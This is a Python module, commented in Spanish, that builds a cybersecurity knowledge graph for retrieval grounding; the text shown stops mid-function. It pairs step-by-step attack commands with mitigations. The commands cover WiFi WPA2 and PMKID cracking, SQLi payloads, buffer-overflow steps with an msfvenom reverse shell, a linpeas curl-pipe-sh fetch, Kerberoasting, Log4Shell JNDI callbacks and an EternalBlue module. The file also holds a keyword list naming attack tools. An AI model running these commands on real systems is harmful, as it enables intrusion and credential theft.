"""
cybersecurity_kg.py - Ontología y Red Semántica de Ciberseguridad (Knowledge Graph / Graph-RAG).
Diseñado para grounding factual y eliminación de alucinaciones en modelos de lenguaje locales (Qwen 3.8 Distill).
"""

from typing import Dict, List, Set, Any, Optional, Tuple
import re

# ==============================================================================
# 1. ONTOLOGÍA FORMAL: DEFINICIÓN DE ENTIDADES Y RELACIONES
# ==============================================================================

CYBER_KNOWLEDGE_GRAPH: Dict[str, Dict[str, Any]] = {
    # --------------------------------------------------------------------------
    # DOMINIO: SEGURIDAD INALÁMBRICA / WIFI (802.11)
    # --------------------------------------------------------------------------
    "wifi_wpa2_audit": {
        "id": "wifi_wpa2_audit",
        "name": "Auditoría WPA2-PSK (4-Way Handshake)",
        "domain": "Wireless Security (802.11)",
        "mitre_id": "T1110 (Brute Force) / T1040 (Network Sniffing)",
        "aliases": ["wifi", "red wifi", "hackeo wifi", "hackear wifi", "wpa2", "wpa", "handshake", "aircrack", "airodump", "aireplay", "wifite", "desautenticacion", "desautenticar"],
        "description": "El protocolo WPA2 Personal usa una clave precompartida (PSK) y un apretón de manos de 4 vías (4-Way Handshake) para derivar la Pairwise Transient Key (PTK). La captura del handshake permite ataques de fuerza bruta u offline dictionary attacks sin alertar a la red objetivo.",
        "prerequisites": ["Tarjeta de red inalámbrica con soporte para modo monitor (monitor mode) e inyección de paquetes (packet injection)"],
        "exact_phases": [
            "1. Identificar interfaz inalámbrica: `ip link` o `iwconfig`",
            "2. Habilitar modo monitor: `airmon-ng check kill` && `airmon-ng start wlan0` (crea wlan0mon)",
            "3. Escaneo de redes y canales: `airodump-ng wlan0mon`",
            "4. Captura enfocada en objetivo: `airodump-ng -c <canal> --bssid <BSSID_AP> -w captura wlan0mon`",
            "5. Desautenticación para forzar reconexión: `aireplay-ng -0 5 -a <BSSID_AP> -c <MAC_CLIENTE> wlan0mon`",
            "6. Craqueo offline del handshake: `aircrack-ng -w <wordlist.txt> -b <BSSID_AP> captura-01.cap` o con hashcat `-m 22000`"
        ],
        "tools": [
            {"name": "airmon-ng", "role": "Gestor de modo monitor", "syntax": "airmon-ng check kill && airmon-ng start <interfaz>"},
            {"name": "airodump-ng", "role": "Sniffer de tramas 802.11 beacon/EAPOL", "syntax": "airodump-ng -c <canal> --bssid <BSSID> -w <salida> <interfaz_mon>"},
            {"name": "aireplay-ng", "role": "Inyector de tramas de desautenticación", "syntax": "aireplay-ng -0 <num_paquetes> -a <BSSID> -c <CLIENTE_MAC> <interfaz_mon>"},
            {"name": "aircrack-ng", "role": "Craqueador de diccionario PBKDF2/PTK", "syntax": "aircrack-ng -w <diccionario> -b <BSSID> <archivo.cap>"},
            {"name": "wifite", "role": "Suite automatizada para auditoría inalámbrica", "syntax": "wifite --kill --wpa"}
        ],
        "mitigations": [
            "Migrar a WPA3-SAE (Simultaneous Authentication of Equals), inmune a ataques offline de diccionario y desautenticación",
            "Usar WPA2-Enterprise (802.1X / RADIUS) con certificados por usuario en lugar de claves compartidas",
            "Claves PSK complejas con más de 16 caracteres alfanuméricos y símbolos",
            "Activar 802.11w (Management Frame Protection - PMF) para evitar tramas de desautenticación falsificadas"
        ],
        "relations": [
            ("protocol_80211", "TARGETS_PROTOCOL", "Afecta el intercambio de tramas EAPOL en redes IEEE 802.11"),
            ("tool_aircrack_suite", "USES_TOOL", "Implementado operativamente mediante la suite Aircrack-ng"),
            ("attack_pmkid", "ALTERNATIVE_ATTACK", "Ataque PMKID con hcxdumptool (no requiere clientes conectados)")
        ]
    },

    "attack_pmkid": {
        "id": "attack_pmkid",
        "name": "Ataque PMKID (WPA/WPA2 sin clientes)",
        "domain": "Wireless Security (802.11)",
        "mitre_id": "T1110.001 (Password Guessing)",
        "aliases": ["pmkid", "hcxdumptool", "hcxtools", "hashcat 22000", "wpa sin clientes"],
        "description": "Ataca el Robust Security Network Information Element (RSN IE) del primer paquete EAPOL emitido por routers modernos. Permite capturar el PMKID directamente del AP sin necesidad de desautenticar ni esperar a usuarios legítimos.",
        "exact_phases": [
            "1. Capturar PMKID del AP: `hcxdumptool -i wlan0mon -o pmkid.pcapng --enable_status=1`",
            "2. Convertir pcapng a formato hashcat 22000: `hcxpcapngtool -o hash.22000 pmkid.pcapng`",
            "3. Craquear con GPU: `hashcat -m 22000 hash.22000 wordlist.txt -d 1`"
        ],
        "tools": [
            {"name": "hcxdumptool", "role": "Captura directa de PMKID", "syntax": "hcxdumptool -i <iface> -o pmkid.pcapng"},
            {"name": "hashcat", "role": "Aceleración GPU modo 22000", "syntax": "hashcat -m 22000 <hash> <wordlist>"}
        ],
        "mitigations": [
            "Deshabilitar funciones de roaming innecesarias (802.11r) en routers antiguos",
            "Actualizar a firmware WPA3-Personal"
        ],
        "relations": [
            ("wifi_wpa2_audit", "VARIANT_OF", "Alternativa moderna a la captura clásica de 4-Way Handshake")
        ]
    },

    # --------------------------------------------------------------------------
    # DOMINIO: ESCANEO DE RED Y RECONOCIMIENTO
    # --------------------------------------------------------------------------
    "network_recon_nmap": {
        "id": "network_recon_nmap",
        "name": "Escaneo de Red y Huella de Servicios (Nmap)",
        "domain": "Network Reconnaissance",
        "mitre_id": "T1046 (Network Service Discovery)",
        "aliases": ["nmap", "escanear puertos", "escaneo de red", "reconocimiento", "puertos abiertos", "servicios de red", "port scanning"],
        "description": "Técnica de descubrimiento de hosts activos, puertos TCP/UDP abiertos, versiones de software en ejecución y sistema operativo mediante paquetes manipulados (SYN, ACK, FIN, UDP).",
        "exact_phases": [
            "1. Escaneo rápido de hosts vivos en subred: `nmap -sn 192.168.1.0/24`",
            "2. Escaneo de puertos comunes y detección de versiones: `nmap -sS -sV -sC -T4 <IP_OBJETIVO>`",
            "3. Escaneo exhaustivo de los 65535 puertos: `nmap -p- --min-rate 1000 <IP_OBJETIVO>`",
            "4. Detección de vulnerabilidades mediante NSE: `nmap --script vuln -p <puertos> <IP_OBJETIVO>`",
            "5. Escaneo de puertos UDP críticos: `nmap -sU --top-ports 50 <IP_OBJETIVO>`"
        ],
        "tools": [
            {"name": "nmap", "role": "Escáner y auditor de puertos de referencia", "syntax": "nmap -sC -sV -p- <target>"},
            {"name": "masscan", "role": "Escaneo masivo asíncrono ultra-rápido", "syntax": "masscan -p1-65535 <target_range> --rate=10000"}
        ],
        "mitigations": [
            "Cerrar puertos innecesarios y aplicar política de Deny All por defecto",
            "Configurar Firewalls de Inspección de Estado (Stateful Inspection)",
            "Desplegar IDS/IPS (Suricata, Snort) para detectar barridos de puertos SYN sostenidos",
            "Habilitar Port Knocking o acceso restringido por listas blancas en servicios de administración (SSH, RDP)"
        ],
        "relations": [
            ("vulnerability_assessment", "PREREQUISITE_OF", "El mapa de puertos abiertos es la base para identificar servicios explotables")
        ]
    },

    # --------------------------------------------------------------------------
    # DOMINIO: SEGURIDAD DE APLICACIONES WEB (OWASP TOP 10)
    # --------------------------------------------------------------------------
    "sqli_sql_injection": {
        "id": "sqli_sql_injection",
        "name": "Inyección SQL (SQL Injection - SQLi)",
        "domain": "Web Application Security",
        "cwe_id": "CWE-89",
        "mitre_id": "T1190 (Exploit Public-Facing Application)",
        "aliases": ["sqli", "sql injection", "inyeccion sql", "inyección sql", "sqlmap", "union select", "blind sql", "sql error"],
        "description": "Vulnerabilidad en la que entradas del usuario no sanitizadas se concatenan directamente en una consulta SQL interpretada por el motor de base de datos. Permite evasión de autenticación, exfiltración completa de tablas, modificación de datos y ejecución remota de comandos en el SGBD (xp_cmdshell, into outfile).",
        "vector_types": [
            "In-Band (Clásica / Error-Based / UNION-Based): Los datos o errores se devuelven en la respuesta HTTP",
            "Inferential / Blind (Boolean-Based): Se evalúan respuestas Verdadero/Falso comparando la lógica de la página",
            "Time-Based Blind: Se fuerza un retardo condicional (ej: `SLEEP(5)`, `pg_sleep(5)`, `WAITFOR DELAY '0:0:5'`)",
            "Out-of-Band (OOB): Se provocan consultas DNS o SMB hacia un servidor controlado por el auditor"
        ],
        "payload_examples": [
            "Auth Bypass: `' OR 1=1 -- -` o `' OR 'a'='a`",
            "UNION Extract: `' UNION SELECT 1, table_name, 3 FROM information_schema.tables WHERE table_schema=database() -- -`",
            "Time Blind: `' OR IF(1=1, SLEEP(4), 0) -- -`"
        ],
        "tools": [
            {"name": "sqlmap", "role": "Herramienta automatizada de detección y explotación de SQLi", "syntax": "sqlmap -u 'http://site.com/item.php?id=1' --batch --dbs"},
            {"name": "Burp Suite", "role": "Intercepción y prueba manual con Repeater/Intruder", "syntax": "Proxy HTTP/HTTPS puerto 8080"}
        ],
        "mitigations": [
            "Consultas Preparadas / Sentencias Parametrizadas (Prepared Statements con PDO en PHP, PreparedStatement en Java, ORMs seguros)",
            "Uso de Procedimientos Almacenados seguros sin concatenación dinámica",
            "Principio de menor privilegio para la cuenta de base de datos (sin permisos de escritura en disco ni dba)",
            "Web Application Firewall (WAF) para filtrado de firmas heurísticas como defensa en profundidad"
        ],
        "relations": [
            ("web_xss", "RELATED_VULN", "Comparte la causa raíz de falta de sanitización de entradas"),
            ("tool_sqlmap", "EXPLOITED_BY", "Explotación exhaustiva con SQLMap")
        ]
    },

    "web_xss": {
        "id": "web_xss",
        "name": "Cross-Site Scripting (XSS)",
        "domain": "Web Application Security",
        "cwe_id": "CWE-79",
        "mitre_id": "T1189 (Drive-by Compromise)",
        "aliases": ["xss", "cross site scripting", "cross-site scripting", "stored xss", "reflected xss", "dom xss", "robo de cookies"],
        "description": "Vulnerabilidad en la que código JavaScript malicioso se inyecta y ejecuta en el contexto de seguridad del navegador de una víctima. Permite robo de tokens de sesión (cookies sin HttpOnly), keylogging, redirecciones maliciosas y defacement.",
        "types": [
            "Reflected XSS: El payload viaja en la petición (ej. URL GET) y se refleja de inmediato en la respuesta HTML",
            "Stored / Persistent XSS: El payload se almacena en la base de datos (comentarios, foros, perfiles) y se ejecuta a cada visitante",
            "DOM-Based XSS: La inyección ocurre enteramente en el lado del cliente al manipular fuentes como `location.search` en sumideros como `innerHTML` o `document.write`"
        ],
        "mitigations": [
            "Codificación contextual de salidas (HTML Entity Encoding, JavaScript Encoding, URL Encoding)",
            "Cabecera `Content-Security-Policy` (CSP) estricta deshabilitando `'unsafe-inline'` y exigiendo nonces",
            "Atributo `HttpOnly` y `SameSite=Strict/Lax` en todas las cookies de autenticación",
            "Librerías de sanitización de HTML seguras como DOMPurify antes de renderizar entradas ricas"
        ],
        "relations": [
            ("sqli_sql_injection", "SIMILAR_FLAW", "Inyección originada por falta de separación entre datos y código")
        ]
    },

    # --------------------------------------------------------------------------
    # DOMINIO: EXPLOTACIÓN BINARIA Y PRIVILEGIOS
    # --------------------------------------------------------------------------
    "binary_buffer_overflow": {
        "id": "binary_buffer_overflow",
        "name": "Desbordamiento de Búfer (Stack Buffer Overflow)",
        "domain": "Binary Exploitation & Memory Corruption",
        "cwe_id": "CWE-121",
        "mitre_id": "T1059 / T1055 (Process Injection)",
        "aliases": ["buffer overflow", "desbordamiento de bufer", "stack overflow", "eip", "rip", "ret2libc", "rop", "shellcode"],
        "description": "Corrupción de memoria en lenguajes no seguros (C/C++) cuando un programa escribe más datos de los asignados en un búfer de pila sin validar límites (ej. `strcpy`, `gets`, `scanf(%s)`). Sobrescribe el puntero de retorno guardado (EIP/RIP) para desviar el flujo de ejecución hacia shellcode inyectado o gadgets ROP.",
        "exact_phases": [
            "1. Detección de crash: Fuzzing con cadenas extensas (`python3 -c 'print(\"A\"*1000)'`)",
            "2. Cálculo del offset exacto a EIP/RIP: Patrón cíclico con `msf-pattern_create -l 1000` y lectura en depurador (`msf-pattern_offset -q <valor_eip>`)",
            "3. Identificación de Bad Characters (evitar caracteres que truncan la memoria como `\\x00`, `\\x0a`, `\\x0d`)",
            "4. Búsqueda de instrucción de salto fiable en el binario sin ASLR: `JMP ESP` / `CALL ESP` (ej: `!mona jmp -r esp`)",
            "5. Generación de shellcode funcional excluyendo badchars con `msfvenom`",
            "6. Estructuración del exploit: `Padding + JMP_ESP_Address + NOP_Sled (\\x90*16) + Shellcode`"
        ],
        "tools": [
            {"name": "GDB (con GEF o Pwndbg)", "role": "Depurador dinámico de bajo nivel en Linux", "syntax": "gdb ./vulnerable_binary"},
            {"name": "checksec", "role": "Verificador de mitigaciones del binario", "syntax": "checksec --file=binario"},
            {"name": "msfvenom", "role": "Generador de shellcodes en bruto", "syntax": "msfvenom -p linux/x86/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -b '\\x00' -f python"}
        ],
        "mitigations": [
            "Compilar con Stack Canaries (`-fstack-protector-all`): Inserta un valor testigo antes del EIP que si se altera aborta el programa",
            "Data Execution Prevention / No-Execute bit (`DEP/NX`): Marca la pila como no ejecutable impidiendo correr shellcode directo",
            "Address Space Layout Randomization (`ASLR`): Aleatoriza las direcciones base de pila, heap y librerías en cada ejecución",
            "Sustituir funciones inseguras (`strcpy`, `strcat`, `sprintf`) por variantes seguras con límite de tamaño (`strncpy`, `snprintf`)"
        ],
        "relations": [
            ("privilege_escalation_linux", "LEADS_TO", "Un exploit binario sobre un ejecutable SUID eleva privilegios a root")
        ]
    },

    "privilege_escalation_linux": {
        "id": "privilege_escalation_linux",
        "name": "Escalada de Privilegios en Linux",
        "domain": "Post-Exploitation",
        "mitre_id": "T1548 (Abuse Elevation Control Mechanism) / T1068",
        "aliases": ["escalada de privilegios", "privilege escalation", "privesc", "root", "suid", "sudo -l", "linpeas", "gtfobins"],
        "description": "Técnicas y vectores para pasar de un usuario con privilegios restringidos (ej: `www-data`, `nobody`, usuario estándar) a control total como superusuario (`root`).",
        "common_vectors": [
            "Binarios con bit SUID anómalo: `find / -perm -u=s -type f 2>/dev/null` cruzado con GTFOBins",
            "Configuraciones permisivas en Sudo: `sudo -l` (ejecución de comandos como root sin contraseña)",
            "Tareas programadas (Cron Jobs): Scripts ejecutados por root con permisos de escritura para usuarios estándar",
            "Capabilities en ejecutables: `getcap -r / 2>/dev/null` (ej: `cap_setuid+ep` en python/perl)",
            "Vulnerabilidades en el Kernel de Linux: Dirty COW (CVE-2016-5195), PwnKit (CVE-2021-4034), Dirty Pipe (CVE-2022-0847)"
        ],
        "tools": [
            {"name": "linpeas.sh", "role": "Script de auditoría y enumeración exhaustiva de vectores de escalada", "syntax": "curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh"},
            {"name": "GTFOBins", "role": "Catálogo de binarios legítimos de Unix explotables para bypass de seguridad", "url": "https://gtfobins.github.io"}
        ],
        "mitigations": [
            "Revisar y eliminar bits SUID innecesarios en todo el árbol del sistema",
            "Configurar `/etc/sudoers` con comandos específicos y rutas absolutas, nunca usar `ALL` ni comodines descontrolados",
            "Mantener el kernel y paquetes actualizados a versiones parcheadas contra CVEs conocidos",
            "Habilitar módulos de seguridad como AppArmor o SELinux en modo Enforcing"
        ],
        "relations": [
            ("binary_buffer_overflow", "VECTOR_FOR", "Los binarios SUID con fallos de memoria permiten escalar inmediatamente a root")
        ]
    },

    # --------------------------------------------------------------------------
    # DOMINIO: ACTIVE DIRECTORY E IDENTIDAD EMPRESARIAL
    # --------------------------------------------------------------------------
    "active_directory_kerberoasting": {
        "id": "active_directory_kerberoasting",
        "name": "Ataque Kerberoasting (Active Directory)",
        "domain": "Enterprise Identity & Active Directory",
        "mitre_id": "T1558.003 (Steal or Forge Kerberos Tickets: Kerberoasting)",
        "aliases": ["kerberoasting", "active directory", "kerberos", "spn", "tgt", "tgs", "impacket", "ticket kerberos", "rubeus"],
        "description": "Técnica post-compromiso en entornos Windows Active Directory donde cualquier usuario autenticado en el dominio puede solicitar un ticket de servicio TGS (Ticket Granting Service) cifrado con el hash NTLM de una cuenta de servicio asociada a un Service Principal Name (SPN). El ticket se extrae y se rompe offline con fuerza bruta.",
        "exact_phases": [
            "1. Enumerar cuentas con SPN registrado: `GetUserSPNs.py dominologin.local/usuario:contraseña -request`",
            "2. Extraer tickets TGS cifrados con RC4 o AES en formato compatible con Hashcat/John",
            "3. Craqueo offline: `hashcat -m 13100 kerberoast_hashes.txt wordlist.txt` (o `-m 19600` si es AES-128/256)"
        ],
        "tools": [
            {"name": "Impacket (GetUserSPNs.py)", "role": "Extracción remota de tickets Kerberos TGS", "syntax": "GetUserSPNs.py domain/user:pass -request -dc-ip <DC_IP>"},
            {"name": "Rubeus", "role": "Interacción y forjado de Kerberos nativo en Windows", "syntax": "Rubeus.exe kerberoast /outfile:hashes.txt"},
            {"name": "Hashcat", "role": "Craqueo offline modo 13100 (Kerberos 5 TGS-REP)", "syntax": "hashcat -m 13100 <tgs_hashes> <wordlist>"}
        ],
        "mitigations": [
            "Migrar cuentas de servicio a Group Managed Service Accounts (gMSA) con contraseñas complejas autogestionadas de 128 caracteres",
            "Si se usan cuentas de servicio manuales, asignar contraseñas aleatorias de más de 30 caracteres inmunes a diccionario",
            "Deshabilitar cifrado débil RC4_HMAC_MD5 en Kerberos y forzar AES-256",
            "Auditar eventos de seguridad de Windows: Event ID 4769 (A ticket was requested) con opciones anómalas"
        ],
        "relations": [
            ("protocol_kerberos", "TARGETS_PROTOCOL", "Abusa del diseño del protocolo Kerberos en Active Directory")
        ]
    }
}

# ==============================================================================
# 2. CLASIFICADOR SEMÁNTICO Y DETECTOR DE INTENCIÓN DE CIBERSEGURIDAD
# ==============================================================================

CYBER_TRIGGER_KEYWORDS: Set[str] = {
    # Redes y WiFi
    "wifi", "wpa", "wpa2", "wpa3", "handshake", "aircrack", "airodump", "aireplay",
    "wifite", "desautenticacion", "desautenticar", "pmkid", "hcxdumptool", "hcxtools",
    "bssid", "essid", "beacon", "modo monitor", "monitor mode", "eapol",
    # Reconocimiento y Redes
    "nmap", "masscan", "puerto", "puertos", "escanear", "escaneo", "sniffing", "sniffer",
    "wireshark", "tshark", "tcpdump", "arp spoofing", "arp poison", "mitm", "man in the middle",
    # Web y OWASP
    "sqli", "sql injection", "inyeccion sql", "inyección sql", "sqlmap", "union select",
    "xss", "cross site", "cross-site", "csrf", "ssrf", "idor", "rce", "remote code execution",
    "burp", "burpsuite", "owasp", "payload", "lfi", "rfi", "path traversal",
    # Binario, Malware y Exploits
    "buffer overflow", "desbordamiento", "shellcode", "rop", "ret2libc", "aslr", "dep",
    "canary", "canaries", "exploit", "exploiting", "gdb", "radare2", "ghidra", "msfvenom",
    "metasploit", "meterpreter", "reverse shell", "bind shell", "suid", "privesc",
    "escalada de privilegios", "linpeas", "winpeas", "gtfobins",
    # Active Directory y Credenciales
    "active directory", "kerberos", "kerberoasting", "mimikatz", "pass the hash",
    "hashcat", "john the ripper", "ntlm", "sam", "shadow", "wordlist", "rockyou",
    "ciberseguridad", "pentest", "pentesting", "hacking", "hacker", "kali linux", "auditoria",
    "vulnerabilidad", "cve", "cwe", "mitre", "red team", "blue team"
}

def is_cybersecurity_query(text: str) -> Tuple[bool, List[str]]:
    """
    Clasificador de intención: Determina si la pregunta del usuario pertenece al
    ámbito de ciberseguridad, auditoría, redes o explotación técnica.
    Si es una pregunta genérica (ej. desarrollo web normal, matemáticas, preguntas generales),
    devuelve False y no activa la inyección del grafo semántico.
    """
    if not text or not isinstance(text, str):
        return False, []

    lower_text = text.lower()
    # Eliminar signos de puntuación comunes para coincidencia de palabras
    clean_words = set(re.findall(r'\b[a-záéíóúñ0-9_\-]{3,}\b', lower_text))

    matched_keywords: List[str] = []
    for kw in CYBER_TRIGGER_KEYWORDS:
        if kw in lower_text or kw in clean_words:
            matched_keywords.append(kw)

    # Solo activar si hay al menos una coincidencia directa de término técnico de seguridad
    is_active = len(matched_keywords) > 0
    return is_active, matched_keywords

# ==============================================================================
# 3. SALTO AL SOTA: BASE DE DATOS DE GRAFOS DINÁMICA (NETWORKX PERSISTENTE) +
#    INGESTA STIX 2.1 MITRE ATT&CK / NVD CVE + BÚSQUEDA VECTORIAL + RERANKER
# ==============================================================================

import os
import json
import math
import time
import hashlib
import urllib.request
import urllib.parse
from pathlib import Path

try:
    import networkx as nx
    HAS_NETWORKX = True
except ImportError:
    nx = None
    HAS_NETWORKX = False

try:
    import numpy as np
    HAS_NUMPY = True
except ImportError:
    np = None
    HAS_NUMPY = False

BASE_DIR = Path(__file__).resolve().parent.parent
GRAPH_STORAGE_DIR = BASE_DIR / ".antigravity_rag"
GRAPH_STORAGE_DIR.mkdir(parents=True, exist_ok=True)
DYNAMIC_GRAPH_FILE = GRAPH_STORAGE_DIR / "dynamic_cyber_graph_stix.json"

STOP_WORDS = {
    "como", "para", "una", "uno", "unos", "unas", "del", "con", "que", "los", "las", "por",
    "sobre", "how", "the", "and", "for", "with", "this", "that", "este", "esta", "estos", "estas",
    "cual", "cuales", "donde", "cuando", "quien", "hacer", "crear", "usar", "usando", "explicame",
    "dame", "muestra", "mostrar", "ver", "paso", "guia", "red", "redes", "forma", "manera"
}

# Catálogo de CVEs Críticos NVD y Objetos STIX 2.1 pre-integrados (actualizables vía API NVD 2.0)
BUILTIN_NVD_CVE_STIX_NODES: Dict[str, Dict[str, Any]] = {
    "cve_2021_44228_log4shell": {
        "id": "cve_2021_44228_log4shell",
        "stix_type": "vulnerability",
        "name": "CVE-2021-44228 (Log4Shell - Apache Log4j2 JNDI RCE)",
        "domain": "Vulnerability / Remote Code Execution (NVD CVSS 10.0)",
        "mitre_id": "T1190 (Exploit Public-Facing Application) / T1203",
        "cwe_id": "CWE-502 (Deserialization of Untrusted Data) / CWE-917",
        "cvss_score": 10.0,
        "aliases": ["cve-2021-44228", "log4shell", "log4j", "jndi", "ldap rce"],
        "description": "Vulnerabilidad crítica (CVSS 10.0) en Apache Log4j2 (2.0-beta9 a 2.14.1) donde el parser de expresiones realiza resoluciones JNDI (LDAP/RMI/DNS) no autenticadas a partir de cadenas registradas, permitiendo ejecución remota de código (RCE).",
        "exact_phases": [
            "1. Detección pasiva/activa de resolución DNS con Canary Callback: `${jndi:ldap://<tu_servidor_interactsh>/a}`",
            "2. En cabeceras HTTP auditadas (User-Agent, X-Forwarded-For, Referer): inyectar payload de prueba JNDI hacia un listener OAST (Interactsh / Burp Collaborator)",
            "3. Verificación con escáneres NVD/Nuclei: `nuclei -u https://objetivo.local -t cves/2021/CVE-2021-44228.yaml`"
        ],
        "tools": [
            {"name": "nuclei", "role": "Escáner de plantillas CVE basado en YAML", "syntax": "nuclei -u <URL> -t cves/2021/CVE-2021-44228.yaml"},
            {"name": "interactsh-client", "role": "Servidor OAST para detectar callbacks DNS/LDAP fuera de banda", "syntax": "interactsh-client -v"}
        ],
        "mitigations": [
            "Actualizar Apache Log4j2 a la versión 2.17.1 o superior (donde JNDI está deshabilitado por defecto)",
            "Establecer propiedad JVM `-Dlog4j2.formatMsgNoLookups=true` en versiones >= 2.10.0",
            "Eliminar la clase JndiLookup del classpath: `zip -q -d log4j-core-*.jar org/apache/logging/log4j/core/lookup/JndiLookup.class`"
        ],
        "relations": [
            ("rce_reverse_shells", "LEADS_TO", "Permite ejecución remota de comandos y obtención de shell interactiva"),
            ("web_sqli", "SHARES_TA_INITIAL_ACCESS", "Ambos pertenecen a la táctica MITRE TA0001 (Initial Access - T1190)")
        ]
    },
    "cve_2017_0144_eternalblue": {
        "id": "cve_2017_0144_eternalblue",
        "stix_type": "vulnerability",
        "name": "CVE-2017-0144 (EternalBlue - SMBv1 Buffer Overflow RCE)",
        "domain": "Network Vulnerability / Windows Kernel Pool Corruption (CVSS 8.8)",
        "mitre_id": "T1210 (Exploitation of Remote Services)",
        "cwe_id": "CWE-119 (Improper Restriction of Operations within the Bounds of a Memory Buffer)",
        "cvss_score": 8.8,
        "aliases": ["cve-2017-0144", "eternalblue", "ms17-010", "smbv1", "puerto 445", "smb exploit"],
        "description": "Vulnerabilidad en la implementación de Server Message Block 1.0 (SMBv1) en Windows (MS17-010). Un error de conversión de tamaño de lista de atributos extendidos (FEA) de 32 bits a 16 bits provoca un desbordamiento en el pool del kernel (srv!SrvOs2FeaListToNt).",
        "exact_phases": [
            "1. Verificación no intrusiva con Nmap NSE: `nmap -p 445 --script smb-vuln-ms17-010 <IP_OBJETIVO>`",
            "2. Verificación con módulo auxiliar de Metasploit: `use auxiliary/scanner/smb/smb_ms17_010`",
            "3. Auditoría autorizada en laboratorio: `use exploit/windows/smb/ms17_010_eternalblue`"
        ],
        "tools": [
            {"name": "nmap", "role": "Detección de vulnerabilidad MS17-010 vía script NSE", "syntax": "nmap -p445 --script smb-vuln-ms17-010 <IP>"},
            {"name": "msfconsole", "role": "Framework de validación de exploits", "syntax": "msfconsole -q -x 'use auxiliary/scanner/smb/smb_ms17_010; set RHOSTS <IP>; run'"}
        ],
        "mitigations": [
            "Aplicar boletín de seguridad Microsoft MS17-010",
            "Deshabilitar por completo el protocolo obsoleto SMBv1 mediante PowerShell: `Disable-WindowsOptionalFeature -Online -FeatureName SMB1Protocol`",
            "Bloquear el puerto TCP 445 en el perímetro y segmentar VLANs con firmas SMB obligatorias"
        ],
        "relations": [
            ("buffer_overflow_x86", "EXPLOITS_MECHANISM", "Utiliza corrupción de memoria en el pool del kernel"),
            ("network_recon_nmap", "DISCOVERED_BY", "Detectado durante fase de reconocimiento de puerto 445")
        ]
    },
    "cve_2024_6387_regresshion": {
        "id": "cve_2024_6387_regresshion",
        "stix_type": "vulnerability",
        "name": "CVE-2024-6387 (regreSSHion - OpenSSH Signal Handler Race Condition)",
        "domain": "System Vulnerability / Race Condition RCE (CVSS 8.1)",
        "mitre_id": "T1190 / T1068",
        "cwe_id": "CWE-362 (Concurrent Execution using Shared Resource / Race Condition) / CWE-479",
        "cvss_score": 8.1,
        "aliases": ["cve-2024-6387", "regresshion", "openssh rce", "sigalrm race condition", "sshd vuln"],
        "description": "Condición de carrera en el manejador de señales SIGALRM de sshd en OpenSSH (8.5p1 hasta < 9.8p1 en sistemas basados en glibc). Cuando un cliente no se autentica dentro de LoginGraceTime, SIGALRM invoca funciones no async-signal-safe (syslog/malloc/free), permitiendo corrupción de heap.",
        "exact_phases": [
            "1. Identificación de banner de versión SSH: `nmap -p 22 -sV <IP_OBJETIVO>`",
            "2. Comprobación de rango afectado: OpenSSH >= 8.5p1 y < 9.8p1 sobre Linux glibc",
            "3. Mitigación inmediata en configuración si no se puede reiniciar binario: `LoginGraceTime 0` en `/etc/ssh/sshd_config`"
        ],
        "tools": [
            {"name": "nmap", "role": "Enumeración de versión de servidor OpenSSH", "syntax": "nmap -p 22 -sV --script ssh2-enum-algos <IP>"}
        ],
        "mitigations": [
            "Actualizar OpenSSH a la versión 9.8p1 o superior inmediatamente",
            "Como mitigación temporal, establecer `LoginGraceTime 0` en `/etc/ssh/sshd_config` (desactiva el código vulnerable de SIGALRM, aunque expone a agotamiento de MaxStartups)"
        ],
        "relations": [
            ("linux_privesc_ad", "LEADS_TO", "Otorga ejecución con privilegios root en el servidor SSH")
        ]
    }
}


def _compute_kg_vector(text: str, dim: int = 192) -> List[float]:
    """Calcula un vector de embedding denso L2-normalizado para nodos del grafo y consultas."""
    vec = [0.0] * dim
    tokens = re.findall(r"[a-záéíóúñ0-9_\-]{2,}", text.lower())
    filtered = [t for t in tokens if t not in STOP_WORDS]
    features = list(filtered)
    for i in range(len(filtered) - 1):
        features.append(f"{filtered[i]}_{filtered[i+1]}")
    if not features:
        return vec
    for f in features:
        h = int(hashlib.md5(f.encode("utf-8", errors="ignore")).hexdigest()[:12], 16)
        idx = h % dim
        sign = 1.0 if ((h >> 8) & 1) == 0 else -1.0
        vec[idx] += sign
    if HAS_NUMPY:
        arr = np.array(vec, dtype=np.float32)
        n = float(np.linalg.norm(arr))
        if n > 1e-8:
            arr = arr / n
        return arr.tolist()
    n = math.sqrt(sum(v * v for v in vec))
    return [v / n for v in vec] if n > 1e-8 else vec


class BGERerankerEngine:
    """
    Motor Reranker Cross-Encoder / Cross-Feature (inspirado en BGE-Reranker):
    Re-evalúa los candidatos recuperados del grafo combinando similitud vectorial densa,
    interacción cruzada de bi-gramas consulta-documento, coincidencia exacta de IDs MITRE/CVE
    y centralidad estructural PageRank en el grafo NetworkX.
    """

    @staticmethod
    def rerank(query: str, candidate_nodes: List[Dict[str, Any]], graph_scores: Dict[str, float], top_k: int = 3) -> List[Dict[str, Any]]:
        q_low = query.lower()
        q_tokens = set(re.findall(r"[a-záéíóúñ0-9_\-]{3,}", q_low)) - STOP_WORDS
        q_bigrams = set()
        q_list = [t for t in re.findall(r"[a-záéíóúñ0-9_\-]{2,}", q_low) if t not in STOP_WORDS]
        for i in range(len(q_list) - 1):
            q_bigrams.add(f"{q_list[i]} {q_list[i+1]}")

        q_vec = _compute_kg_vector(query)
        reranked = []

        for node in candidate_nodes:
            nid = node["id"]
            doc_text = " ".join([
                node.get("name", ""),
                node.get("domain", ""),
                node.get("mitre_id", ""),
                node.get("cwe_id", ""),
                node.get("description", ""),
                " ".join(node.get("aliases", [])),
                " ".join(t.get("name", "") + " " + t.get("syntax", "") for t in node.get("tools", []))
            ])
            doc_low = doc_text.lower()
            d_vec = node.get("_embedding") or _compute_kg_vector(doc_text)

            # 1. Similitud Vectorial Coseno (Dense Embedding Score)
            if HAS_NUMPY:
                vec_score = float(np.dot(np.asarray(q_vec, dtype=np.float32), np.asarray(d_vec, dtype=np.float32)))
            else:
                vec_score = sum(a * b for a, b in zip(q_vec, d_vec))

            # 2. Interacción Cruzada Cross-Feature (Alias, Herramientas, Bi-gramas, CVE/MITRE ID)
            cross_score = 0.0
            for alias in node.get("aliases", []):
                al_low = alias.lower()
                if al_low in q_low:
                    cross_score += 0.45
                elif (set(al_low.split()) - STOP_WORDS) & q_tokens:
                    cross_score += 0.16

            for bg in q_bigrams:
                if bg in doc_low:
                    cross_score += 0.25

            for t in node.get("tools", []):
                t_first = t["name"].lower().split()[0]
                if t_first in q_low:
                    cross_score += 0.35

